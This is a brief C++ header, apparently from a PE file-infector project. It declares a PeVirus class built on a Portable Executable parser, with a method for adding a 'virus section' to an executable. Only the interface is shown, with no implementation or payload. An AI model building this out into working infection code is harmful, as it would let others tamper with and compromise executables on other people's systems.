#include "pecpp.h"
#include "virus.h"

namespace virus
{
    class PeVirus: public pe::PortableExecutable
    {
        public:
        PeVirus(const std::string_view& full_path);
        
        void AddVirusSection(const std::vector<unsigned char>& section_data);
    };
}
